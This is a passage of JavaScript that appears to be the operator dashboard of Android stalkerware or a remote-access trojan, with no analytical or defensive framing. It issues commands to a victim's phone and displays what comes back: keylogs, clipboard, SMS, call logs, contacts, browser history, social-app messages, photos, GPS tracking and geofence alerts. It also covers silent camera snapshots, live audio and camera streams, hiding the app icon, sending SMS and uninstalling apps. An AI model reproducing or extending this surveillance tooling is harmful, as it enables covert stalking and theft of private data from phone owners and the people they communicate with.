function displayContacts(data){ if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>Contacts</h3><p>None.</p>'; return; } panel.innerHTML=`<h3>Contacts (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>Name</th><th>Number</th><th>Times Contacted</th></tr></thead><tbody>${data.map(c=>`<tr><td>${escapeHtml(c.name||'')}</td><td>${escapeHtml(c.number||'')}</td><td style="text-align:center">${c.timesContacted||0}</td></tr>`).join('')}</tbody></table></div>`; }
function displayInstalledApps(data){ if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>Apps</h3><p>None.</p>'; return; } panel.innerHTML=`<h3>Installed Apps (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>App</th><th>Package</th><th>Actions</th></tr></thead><tbody>${data.map(app=>`<tr><td>${escapeHtml(app.appName||'')}</td><td style="font-size:11px;">${escapeHtml(app.packageName||'')}</td><td><button class="open-app" data-pkg="${escapeHtml(app.packageName)}">Open</button> <button class="remove-app" data-pkg="${escapeHtml(app.packageName)}">Remove</button></td></tr>`).join('')}</tbody></table></div>`; document.querySelectorAll('.open-app').forEach(btn=>btn.onclick=()=>sendCommand('OPEN_APP',{package:btn.dataset.pkg})); document.querySelectorAll('.remove-app').forEach(btn=>btn.onclick=()=>sendCommand('UNINSTALL_APP',{package:btn.dataset.pkg})); }
function displayBrowserHistory(data){ if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>Browser History</h3><p>None.</p>'; return; } panel.innerHTML=`<h3>Browser History (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>Date</th><th>Title</th><th>URL</th></tr></thead><tbody>${data.map(item=>`<tr><td>${escapeHtml(item.date||item.timeFmt||'')}</td><td>${escapeHtml(item.title||'')}</td><td><a href="${escapeHtml(item.url||'#')}" target="_blank">${escapeHtml(item.url||'')}</a></td></tr>`).join('')}</tbody></table></div>`; }
function displayWifiNetworks(data){ if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>Wi-Fi</h3><p>None.</p>'; return; } panel.innerHTML=`<h3>Wi-Fi Networks (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>SSID</th><th>Signal</th><th>Status</th></tr></thead><tbody>${data.map(n=>{ const bars=n.rssi>-50?'████':n.rssi>-70?'███░':n.rssi>-80?'██░░':'█░░░'; return `<tr${n.connected?' style="background:#f0fff4"':''}><td>${escapeHtml(n.ssid||'(hidden)')}</td><td>${bars}</td><td>${n.connected?'● Connected':'○'}</td></tr>`; }).join('')}</tbody></table></div>`; }
function displayAppUsage(data){ if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>Screen Time</h3><p>No data.</p>'; return; } const max=Math.max(...data.map(a=>a.totalTimeMs||0)); panel.innerHTML=`<h3>Screen Time</h3>${data.map(app=>{ const t=app.totalTimeMs||0; const pct=max?Math.round(t/max*100):0; return `<div class="app-usage-item"><div class="app-usage-name">${escapeHtml(app.appName||app.packageName)}</div><div class="usage-bar-container"><div class="usage-bar" style="width:${pct}%; background-color:${t>3600000?'#d32f2f':t>1800000?'#ff9800':'#4caf50'}"></div></div><div class="app-usage-time">${formatDuration(t)}</div></div>`; }).join('')}</div>`; }
function displayKeylog(data){ if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>Keylog</h3><p>None.</p>'; return; } panel.innerHTML=`<div style="display:flex;justify-content:space-between;"><h3>Keylog (${data.length})</h3><button id="clearKeylogBtn" style="background:#d32f2f;color:white;">Clear</button></div><div style="overflow-x:auto;"><table><thead><tr><th>Time</th><th>App</th><th>Text</th></tr></thead><tbody>${data.slice().reverse().map(e=>`<tr><td>${escapeHtml(e.timeFmt||'')}</td><td>${escapeHtml((e.pkg||'').split('.').pop())}</td><td>${escapeHtml(e.text||e.key||'')}</td></tr>`).join('')}</tbody></tr></div>`; document.getElementById('clearKeylogBtn')?.addEventListener('click',()=>sendCommand('CLEAR_KEYLOG')); }
function displayClipboard(data){ const content=data&&data.content?data.content:(data||''); panel.innerHTML=`<h3>Clipboard</h3><div style="padding:16px; background:#f8fafc;">${escapeHtml(content)}</div><p>Captures copied text.</p>`; }
function displaySocialMessages(data){ let msgs=typeof data==='string'?JSON.parse(data):data; if(!Array.isArray(msgs)||!msgs.length){ panel.innerHTML='<h3>Social Messages</h3><p>None.</p>'; return; } panel.innerHTML=`<h3>Social Messages (${msgs.length})</h3><div style="overflow-y:auto;max-height:60vh;">`+msgs.slice().reverse().map(m=>`<div style="background:#fff;border:1px solid #eee;border-radius:10px;padding:12px;margin-bottom:8px;"><div><strong>${escapeHtml(m.app||'Unknown')}</strong> <small>${m.timeFmt||''}</small></div><div>${escapeHtml(m.title||'')}</div><div>${escapeHtml(m.text||m.body||'')}</div></div>`).join('')+`</div>`; }
function renderMap(loc){ let l=typeof loc==='string'?JSON.parse(loc):loc; const lat=l.lat||l.latitude, lon=l.lon||l.longitude, acc=l.accuracy||10; currentLocation={lat,lon,acc}; panel.innerHTML=`<div id="map" style="height:380px;"></div><div class="map-info">📍 ${lat.toFixed(6)}, ${lon.toFixed(6)}<br>🎯 Accuracy: ${acc.toFixed(1)}m</div>`; if(mapInstance)mapInstance.remove(); mapInstance=L.map('map').setView([lat,lon],18); L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance); L.circle([lat,lon],{radius:acc,color:'#1976ff',fillOpacity:0.2}).addTo(mapInstance); L.marker([lat,lon]).addTo(mapInstance).bindPopup('Device Location'); }
function showGeofencePanel(){ if(!currentLocation){ sendCommand('GET_LOCATION'); panel.innerHTML='<h3>Geofence</h3><p>Fetching location...</p>'; setTimeout(()=>{ if(currentLocation) showGeofencePanelWithLocation(); else panel.innerHTML='<p>Unable to get location.</p>'; },2000); return; } showGeofencePanelWithLocation(); }
function showGeofencePanelWithLocation(){ const lat=currentLocation.lat, lon=currentLocation.lon; panel.innerHTML=`<h3>Geofence</h3><div id="geofenceMap" style="height:320px;"></div><div><input id="gfLat" value="${lat.toFixed(6)}"><input id="gfLon" value="${lon.toFixed(6)}"><input id="gfRadius" value="500"></div><div class="geofence-controls"><button id="setFenceBtn">Set Fence</button><button id="clearFenceBtn">Clear</button><button id="getFenceStatusBtn">Status</button></div><div id="fenceStatus"></div>`; setTimeout(()=>{ const map=L.map('geofenceMap').setView([lat,lon],15); L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map); let marker=L.marker([lat,lon]).addTo(map); let circle; map.on('click',e=>{ document.getElementById('gfLat').value=e.latlng.lat.toFixed(6); document.getElementById('gfLon').value=e.latlng.lng.toFixed(6); if(marker)map.removeLayer(marker); marker=L.marker([e.latlng.lat,e.latlng.lng]).addTo(map); if(circle)map.removeLayer(circle); const r=parseFloat(document.getElementById('gfRadius').value)||500; circle=L.circle([e.latlng.lat,e.latlng.lng],{radius:r,color:'#d32f2f',fillOpacity:0.15}).addTo(map); }); document.getElementById('setFenceBtn').onclick=()=>{ const lat2=parseFloat(document.getElementById('gfLat').value), lon2=parseFloat(document.getElementById('gfLon').value), rad=parseFloat(document.getElementById('gfRadius').value)||500; sendCommand('SET_GEOFENCE',{lat:lat2,lon:lon2,radius:rad}); }; document.getElementById('clearFenceBtn').onclick=()=>sendCommand('CLEAR_GEOFENCE'); document.getElementById('getFenceStatusBtn').onclick=()=>sendCommand('GET_GEOFENCE'); },100); }
function displayGeofenceInfo(data){ const statusDiv=document.getElementById('fenceStatus'); if(statusDiv && data && data.active){ statusDiv.innerHTML=`<div style="margin-top:12px;padding:12px;background:#e8f5e9;"><strong>Active</strong><br>📍 ${data.lat.toFixed(5)}, ${data.lon.toFixed(5)}<br>📏 Radius: ${data.radius}m</div>`; }else if(statusDiv){ statusDiv.innerHTML=`<div style="margin-top:12px;padding:12px;background:#fff3e0;">No active geofence</div>`; } }
function showSchedulePanel(){ panel.innerHTML='<h3>Auto Capture</h3><input id="schedInterval" placeholder="Minutes"><button onclick="sendCommand(\'SET_SCHEDULED_CAPTURE\',{intervalMinutes:parseInt(document.getElementById(\'schedInterval\').value)})">Start</button>'; }
function showSendSmsPanel(){ panel.innerHTML='<h3>Send SMS</h3><input id="smsNumber" placeholder="Number"><textarea id="smsBody" rows="3"></textarea><button onclick="sendCommand(\'SEND_SMS\',{number:document.getElementById(\'smsNumber\').value,body:document.getElementById(\'smsBody\').value})">Send</button>'; }
function showLocationHistoryPanel(){ panel.innerHTML='<h3>Location History</h3><button onclick="sendCommand(\'GET_LOCATION_HISTORY\',{days:3})">Load 3 days</button><div id="historyList"></div>'; sendCommand('GET_LOCATION_HISTORY',{days:3}); }
function displayLocationHistory(data){ const container=document.getElementById('historyList'); if(container) container.innerHTML = data.length ? `<pre>${JSON.stringify(data,null,2)}</pre>` : '<p>No history</p>'; }
function showPhotoGalleryPanel(){ panel.innerHTML='<h3>Photo Gallery</h3><button onclick="sendCommand(\'GET_RECENT_IMAGES\',{days:5})">Load</button><div id="photoGrid"></div>'; sendCommand('GET_RECENT_IMAGES',{days:5}); }
function displayPhotoGallery(data){ const grid=document.getElementById('photoGrid'); if(grid) grid.innerHTML = data.length ? data.map(img=>`<div><img src="data:image/jpeg;base64,${img.thumb}" style="width:100px;"></div>`).join('') : '<p>No images</p>'; }
function showAppEventsPanel(){ panel.innerHTML='<h3>App Events</h3><button onclick="sendCommand(\'GET_APP_EVENTS\',{days:5})">Load</button><div id="appEventsList"></div>'; sendCommand('GET_APP_EVENTS',{days:5}); }
function displayAppEvents(data){ const container=document.getElementById('appEventsList'); if(container) container.innerHTML = data.length ? data.map(ev=>`<div><strong>${ev.type}</strong> ${ev.name||ev.pkg} - ${ev.timeFmt}</div>`).join('') : '<p>No events</p>'; }
function showSmsKeywordsPanel(){ panel.innerHTML='<h3>SMS Keywords</h3><input id="kwInput" placeholder="keyword1,keyword2"><button onclick="sendCommand(\'SET_SMS_KEYWORDS\',{keywords:document.getElementById(\'kwInput\').value.split(\',\')})">Save</button>'; }
function displaySmsKeywords(data){ const div=document.getElementById('kwResult'); if(div) div.innerHTML = data.length ? `<p>Keywords: ${data.join(', ')}</p>` : '<p>No keywords</p>'; }
function displaySmsAlerts(data){ const div=document.getElementById('kwResult'); if(div) div.innerHTML = data.length ? data.map(a=>`<div>${a.keyword} from ${a.from}: ${a.body}</div>`).join('') : '<p>No alerts</p>'; }
function showAppUsagePanel(){ panel.innerHTML='<h3>Screen Time</h3><button onclick="sendCommand(\'GET_APP_USAGE\',{days:1})">Today</button><button onclick="sendCommand(\'GET_APP_USAGE\',{days:7})">7 Days</button><div id="usageList"></div>'; sendCommand('GET_APP_USAGE',{days:1}); }
function capturePicture(){ const camera=document.querySelector('input[name="clickCameraSelect"]:checked').value; sendCommand('CAMERA_SNAPSHOT',{camera,flash:document.getElementById('clickFlashCheckbox').checked}); }
function displayCapturedImage(b64){ panel.innerHTML=`<img src="data:image/jpeg;base64,${b64}" style="max-width:100%;"><button onclick="downloadBase64('${b64}','snapshot.jpg')">Save</button>`; }
function toggleLiveGps(){ liveGpsActive=!liveGpsActive; sendCommand(liveGpsActive?'START_GPS_UPDATES':'STOP_GPS_UPDATES'); const btn=document.getElementById('liveGpsBtn'); if(btn) btn.querySelector('span:last-child').textContent=liveGpsActive?'Stop GPS Track':'Live GPS Track'; }
function toggleAppIcon(){ sendCommand(iconHidden?'SHOW_APP':'HIDE_APP'); }
function toggleFlash(){ sendCommand(flashOn?'FLASH_OFF':'FLASH_ON'); }

// ==================== MESSAGE HANDLER ====================
function handleJSON(json){
    if(Array.isArray(json)){
        if(pendingCommand==='LIST_FILES'){ currentData=json; renderFiles(); }
        else if(pendingCommand==='GET_SMS'){ displaySMS(json); }
        else if(pendingCommand==='GET_CALL_LOGS'){ const rows=json.map(c=>[c.type||'',c.number||'',c.name||'',c.date||c.timeFmt||'',c.duration?c.duration+'s':'']); renderTable(rows,['Type','Number','Name','Date','Duration']); }
        pendingCommand=null; return;
    }
    switch(json.type){
        case 'FILE_LIST': try{ currentData=typeof json.data==='string'?JSON.parse(json.data):json.data; if(window.pendingFolderLoad) { const { inner } = window.pendingFolderLoad; inner.innerHTML = renderFileTreeNodes(currentData, window.pendingFolderLoad.path); window.pendingFolderLoad = null; attachFileEventListeners(); } else { renderFiles(); } }catch(e){} break;
        case 'SMS_DATA': try{ displaySMS(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'CALL_LOGS': try{ const d=typeof json.data==='string'?JSON.parse(json.data):json.data; const rows=d.map(c=>[c.type||'',c.number||'',c.name||'',c.date||c.timeFmt||'',c.duration?c.duration+'s':'']); renderTable(rows,['Type','Number','Name','Date','Duration']); }catch(e){} break;
        case 'SOCIAL_MESSAGES_DATA': try{ displaySocialMessages(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'CAMERA_IMAGE': displayCapturedImage(json.data); break;
        case 'LOCATION_UPDATE': renderMap(json.data||json); break;
        case 'GEOFENCE_INFO': try{ displayGeofenceInfo(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'FILE_INFO': fileTransfers[json.transferId]={chunks:new Array(json.totalChunks),totalChunks:json.totalChunks,fileName:json.fileName,received:0}; document.getElementById('progressFileName').innerText=json.fileName; document.getElementById('progressPercent').innerText='0%'; document.getElementById('progressBar').style.width='0%'; document.getElementById('downloadProgress').style.display='block'; break;
        case 'FILE_CHUNK': const tr=fileTransfers[json.transferId]; if(!tr)return; setTimeout(()=>{ try{ const bin=atob(json.data), bytes=new Uint8Array(bin.length); for(let i=0;i<bin.length;i++) bytes[i]=bin.charCodeAt(i); tr.chunks[json.chunkIndex]=bytes; tr.received++; const pct=Math.round((tr.received/tr.totalChunks)*100); document.getElementById('progressPercent').innerText=pct+'%'; document.getElementById('progressBar').style.width=pct+'%'; if(tr.received===tr.totalChunks){ const blob=new Blob(tr.chunks), url=URL.createObjectURL(blob), a=document.createElement('a'); a.href=url; a.download=tr.fileName; a.click(); URL.revokeObjectURL(url); delete fileTransfers[json.transferId]; document.getElementById('downloadProgress').style.display='none'; showNotification(`✅ Downloaded: ${tr.fileName}`); } }catch(e){ showNotification('Chunk decode error'); delete fileTransfers[json.transferId]; document.getElementById('downloadProgress').style.display='none'; } },0); break;
        case 'FLASH_ON': flashOn=true; document.getElementById('flashBtn').innerText='Flash Off'; showNotification('Flash ON'); break;
        case 'FLASH_OFF': flashOn=false; document.getElementById('flashBtn').innerText='Flash On'; showNotification('Flash OFF'); break;
        case 'APP_HIDDEN': iconHidden=true; document.getElementById('iconBtn').innerText='Show Icon'; break;
        case 'APP_SHOWN': iconHidden=false; document.getElementById('iconBtn').innerText='Hide Icon'; break;
        case 'CONTACTS_DATA': try{ displayContacts(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'INSTALLED_APPS': try{ displayInstalledApps(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'APP_USAGE_DATA': try{ displayAppUsage(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'BROWSER_HISTORY_DATA': try{ displayBrowserHistory(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'WIFI_NETWORKS_DATA': try{ displayWifiNetworks(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'KEYLOG_DATA': try{ displayKeylog(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'CLIPBOARD_DATA': try{ displayClipboard(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'RECENT_IMAGES_DATA': try{ displayPhotoGallery(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'LOCATION_HISTORY_DATA': try{ displayLocationHistory(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'APP_EVENTS_DATA': try{ displayAppEvents(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'SMS_KEYWORDS_DATA': try{ displaySmsKeywords(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'SMS_ALERTS_DATA': try{ displaySmsAlerts(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'GEOFENCE_SET': showNotification('Geofence activated'); break;
        case 'GEOFENCE_CLEARED': showNotification('Geofence cleared'); break;
        case 'GEOFENCE_ALERT': pushAlert('Geofence',json.event==='EXIT'?'🚨 LEFT zone':'✅ Entered zone'); break;
        case 'SCHEDULED_CAPTURE_SET': showNotification('Auto-capture started'); break;
        case 'SCHEDULED_CAPTURE_STOPPED': showNotification('Auto-capture stopped'); break;
        case 'DEVICE_LOCKED': showNotification('Screen locked'); break;
        case 'SMS_SENT': showNotification('SMS sent'); break;
        case 'FILE_DELETED': showNotification('File deleted'); sendCommand('LIST_FILES',{path:currentPath}); break;
        case 'VIBRATE_COMPLETE': showNotification('Vibrated'); break;
        case 'GPS_UPDATES_STOPPED': liveGpsActive=false; showNotification('GPS stopped'); break;
        case 'NOTIFICATION_LIVE': pushAlert('📳 '+(json.app||'App'),(json.title||'')+': '+(json.text||'')); break;
        case 'CALL_ALERT': if(json.event==='RINGING') pushAlert('Incoming Call',json.name||json.number); else if(json.event==='MISSED') pushAlert('Missed Call',json.name||json.number); break;
        case 'SMS_KEYWORD_ALERT': pushAlert('Keyword: '+json.keyword,'From '+json.from+': '+json.body); break;
        default: console.log('Unhandled',json.type);
    }
    pendingCommand=null;
}
function handlePlainText(msg){
    if(msg.startsWith("CAMERA_IMAGE:")) displayCapturedImage(msg.substring(13));
    else if(msg.startsWith("FLASH_ON")){ flashOn=true; document.getElementById('flashBtn').innerText='Flash Off'; showNotification('Flash ON'); }
    else if(msg.startsWith("FLASH_OFF")){ flashOn=false; document.getElementById('flashBtn').innerText='Flash On'; showNotification('Flash OFF'); }
    else if(msg.startsWith("LOC_DATA:")) try{ renderMap(JSON.parse(msg.substring(9))); }catch(e){}
    else if(msg.startsWith("SMS_DATA:")) try{ displaySMS(JSON.parse(msg.substring(9))); }catch(e){}
    else if(msg.startsWith("CALL_DATA:")) try{ const d=JSON.parse(msg.substring(10)); const rows=d.map(c=>[c.type||'',c.number||'',c.name||'',c.date||c.timeFmt||'',c.duration?c.duration+'s':'']); renderTable(rows,['Type','Number','Name','Date','Duration']); }catch(e){}
    else if(msg.startsWith('[')||msg.startsWith('{')) try{ handleJSON(JSON.parse(msg)); }catch(e){}
}
function handleIncomingMessage(msg){
    try{ const j=JSON.parse(msg); if(j.type==='SIGNALING') handleSignaling(j.data); else handleJSON(j); }catch(e){ handlePlainText(msg); }
}

// ==================== EVENT LISTENERS ====================
function setupEvents(){
    document.getElementById('screenShareBtn').onclick=toggleScreen;
    document.getElementById('clickPictureBtn').onclick=()=>document.getElementById('clickCameraPanel').classList.toggle('show');
    document.getElementById('capturePictureBtn').onclick=capturePicture;
    document.getElementById('liveCameraBtn').onclick=()=>document.getElementById('liveCameraPanel').classList.toggle('show');
    document.getElementById('startLiveStreamBtn').onclick=startLiveStream;
    document.getElementById('liveAudioBtn').onclick=startLiveAudio;
    document.getElementById('stopLiveAudioBtn').onclick=stopLiveAudio;
    document.getElementById('getLocationBtn').onclick=()=>sendCommand('GET_LOCATION');
    document.getElementById('fileManagerBtn').onclick=()=>refreshFileRoot();
    document.getElementById('smsBtn').onclick=()=>{ currentPage=0; sendCommand('GET_SMS',{box:'all'}); };
    document.getElementById('callLogsBtn').onclick=()=>{ currentPage=0; sendCommand('GET_CALL_LOGS'); };
    document.getElementById('contactsBtn').onclick=()=>{ currentPage=0; sendCommand('GET_CONTACTS'); };
    document.getElementById('installedAppsBtn').onclick=()=>{ currentPage=0; sendCommand('GET_INSTALLED_APPS'); };
    document.getElementById('browserHistoryBtn').onclick=()=>sendCommand('GET_BROWSER_HISTORY');
    document.getElementById('wifiNetworksBtn').onclick=()=>sendCommand('GET_WIFI_NETWORKS');
    document.getElementById('screenTimeBtn').onclick=showAppUsagePanel;
    document.getElementById('socialMessagesBtn').onclick=()=>sendCommand('GET_SOCIAL_MESSAGES',{days:3});
    document.getElementById('keylogBtn').onclick=()=>sendCommand('GET_KEYLOG');
    document.getElementById('clipboardBtn').onclick=()=>sendCommand('GET_CLIPBOARD');
    document.getElementById('geofenceBtn').onclick=showGeofencePanel;
    document.getElementById('autoCaptureBtn').onclick=showSchedulePanel;
    document.getElementById('liveGpsBtn').onclick=toggleLiveGps;
    document.getElementById('locationHistoryBtn').onclick=showLocationHistoryPanel;
    document.getElementById('callRecordingsBtn').onclick=showCallRecordingsPanel;
    document.getElementById('photoGalleryBtn').onclick=showPhotoGalleryPanel;
    document.getElementById('appEventsBtn').onclick=showAppEventsPanel;
    document.getElementById('smsKeywordsBtn').onclick=showSmsKeywordsPanel;
    document.getElementById('toggleAppIconBtn').onclick=toggleAppIcon;
    document.getElementById('lockDeviceBtn').onclick=()=>sendCommand('LOCK_DEVICE');
    document.getElementById('sendSmsBtn').onclick=showSendSmsPanel;
    document.getElementById('vibrateBtn').onclick=()=>sendCommand('VIBRATE',{duration:1000});
    document.getElementById('toggleFlashBtn').onclick=toggleFlash;
    document.getElementById('reconnectBtn').onclick=manualReconnect;
    document.getElementById('clearAlertsBtn').onclick=clearAlerts;
    document.getElementById('logoutBtn').onclick=logout;
}
renderAuthForm(); setupEvents();
</script>
